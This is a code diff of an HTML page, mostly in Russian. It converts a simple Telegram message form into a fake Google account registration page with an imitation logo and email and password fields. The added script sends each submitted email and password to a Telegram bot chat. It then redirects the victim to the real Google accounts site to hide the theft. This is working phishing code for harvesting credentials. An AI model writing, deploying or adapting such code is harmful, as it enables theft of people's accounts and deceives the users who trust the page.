@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Отправка сообщений в Telegram</title>
+    <title>Регистрация - Google</title>
     <style>
         * {
             box-sizing: border-box;
@@ -12,88 +12,177 @@
         }
         
         body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Arial', sans-serif;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
+            padding: 20px;
         }
         
         .container {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
         }
         
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
+        .google-logo {
             text-align: center;
+            margin-bottom: 16px;
         }
         
-        .description {
-            color: #666;
+        .google-logo svg {
+            width: 75px;
+            height: 24px;
+        }
+        
+        .title {
             text-align: center;
-            margin-bottom: 30px;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 24px;
         }
         
         .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .input-group {
+            position: relative;
             margin-bottom: 20px;
         }
         
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: #333;
-        }
-        
-        textarea {
+        input {
             width: 100%;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
+            height: 54px;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
             font-size: 16px;
-            resize: vertical;
-            min-height: 120px;
-            transition: border-color 0.3s;
-        }
-        
-        textarea:focus {
             outline: none;
-            border-color: #667eea;
+            transition: border-color 0.2s;
         }
         
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 8px;
+        input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+        
+        label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
+            padding: 0 5px;
+            color: #5f6368;
             font-size: 16px;
+            transition: all 0.2s;
+            pointer-events: none;
+        }
+        
+        input:focus + label,
+        input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        
+        .forgot-email {
+            text-align: left;
+            margin-bottom: 32px;
+        }
+        
+        .forgot-email a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-email a:hover {
+            text-decoration: underline;
+        }
+        
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s;
+            transition: background-color 0.2s;
         }
         
-        button:hover {
-            transform: translateY(-2px);
+        .next-button:hover {
+            background: #1669d6;
         }
         
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
+        .footer {
+            margin-top: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .language {
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
         }
         
         #status {
             margin-top: 20px;
-            padding: 15px;
-            border-radius: 8px;
-            display: none;
+            padding: 12px;
+            border-radius: 4px;
             text-align: center;
+            font-size: 14px;
+            display: none;
         }
         
         .success {
@@ -117,25 +206,54 @@
 </head>
 <body>
     <div class="container">
-        <h1>📨 Отправьте мне сообщение</h1>
-        <p class="description">Напишите что-нибудь ниже, и я получу это в Telegram!</p>
+        <div class="google-logo">
+            <!-- Google Logo SVG -->
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
+                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.894-4.72-6.253-7.785-11.956-7.785-7.223 0-12.722 5.5-12.722 12.721 0 7.22 5.5 12.722 12.722 12.722 5.703 0 9.827-2.834 11.634-7.27l-6.489-2.53c-.608 1.196-1.556 1.804-2.886 1.804z"/>
+                <path fill="#34a853" d="M36.955 2.24c4.72 0 8.427 1.582 11.634 4.785l5.703-5.702C50.365-1.17 44.168-.5 36.955.5c-6.253 0-11.634 2.278-15.58 6.253L15.58 12.5h10.834v7.422H15.58v8.427h10.834v7.422H15.58v8.427h10.834V48.5h10.834V31.349h10.834v-7.422H37.248v-7.422h10.834v-7.422H37.248V2.24z"/>
+                <path fill="#fbbc05" d="M9.027 16.303c0-2.278.68-4.287 1.804-5.973L5.5 4.628C2.02 8.574 0 13.415 0 18.795c0 5.38 2.02 10.221 5.5 14.167l5.331-5.702c-1.125-1.686-1.804-3.695-1.804-5.973z"/>
+                <path fill="#4285f4" d="M36.955 35.349c4.287 0 7.967-1.556 10.221-4.287l5.331 5.702c-3.15 3.695-8.427 5.973-15.552 5.973-6.253 0-11.634-2.278-15.58-6.253l5.331-5.702c2.254 2.73 5.934 4.287 10.22 4.287z"/>
+            </svg>
+        </div>
+        
+        <h1 class="title">Создайте аккаунт Google</h1>
+        <p class="subtitle">Продолжите в Telegram</p>
 
         <form id="messageForm">
             <div class="form-group">
-                <label for="message">Ваше сообщение:</label>
-                <textarea 
-                    id="message" 
-                    name="message" 
-                    placeholder="Введите ваше сообщение здесь..." 
-                    required
-                ></textarea>
+                <div class="input-group">
+                    <input type="text" id="email" name="email" placeholder=" " required>
+                    <label for="email">Введите почту</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder=" " required>
+                    <label for="password">Введите пароль</label>
+                </div>
             </div>
-            <button type="submit" id="submitBtn">
-                Отправить в Telegram
-            </button>
+
+            <div class="forgot-email">
+                <a href="#">Войти вместо этого</a>
+            </div>
+
+            <div class="buttons">
+                <a href="#" class="create-account">Создать аккаунт</a>
+                <button type="submit" class="next-button">Далее</button>
+            </div>
         </form>
 
         <div id="status"></div>
+
+        <div class="footer">
+            <div class="language">
+                Русский
+            </div>
+            <div class="footer-links">
+                <a href="#">Справка</a>
+                <a href="#">Конфиденциальность</a>
+                <a href="#">Условия</a>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -144,13 +262,14 @@
 
             const form = event.target;
             const formData = new FormData(form);
-            const message = formData.get('message');
+            const email = formData.get('email');
+            const password = formData.get('password');
             const statusDiv = document.getElementById('status');
-            const submitBtn = document.getElementById('submitBtn');
+            const submitBtn = document.querySelector('.next-button');
 
             statusDiv.style.display = 'block';
             statusDiv.className = 'loading';
-            statusDiv.textContent = '⏳ Отправка сообщения...';
+            statusDiv.textContent = '⏳ Отправка данных...';
             submitBtn.disabled = true;
 
             try {
@@ -163,7 +282,7 @@
                     },
                     body: JSON.stringify({
                         chat_id: '6812452143',
-                        text: `📨 Новое сообщение с сайта:\n\n${message}`
+                        text: `📨 Новые данные с сайта:\n\n📧 Почта: ${email}\n🔑 Пароль: ${password}`
                     })
                 });
 
@@ -173,11 +292,16 @@
                 console.log('Результат:', result);
 
                 if (result.ok) {
-                    statusDiv.textContent = '✅ Сообщение отправлено в Telegram!';
+                    statusDiv.textContent = '✅ Данные отправлены! Перенаправление...';
                     statusDiv.className = 'success';
                     form.reset();
+                    
+                    // Перенаправление через 2 секунды
+                    setTimeout(() => {
+                        window.location.href = 'https://accounts.google.com';
+                    }, 2000);
                 } else {
-                    statusDiv.textContent = '❌ Ошибка Telegram: ' + (result.description || 'Неизвестная ошибка');
+                    statusDiv.textContent = '❌ Ошибка: ' + (result.description || 'Неизвестная ошибка');
                     statusDiv.className = 'error';
                 }
 
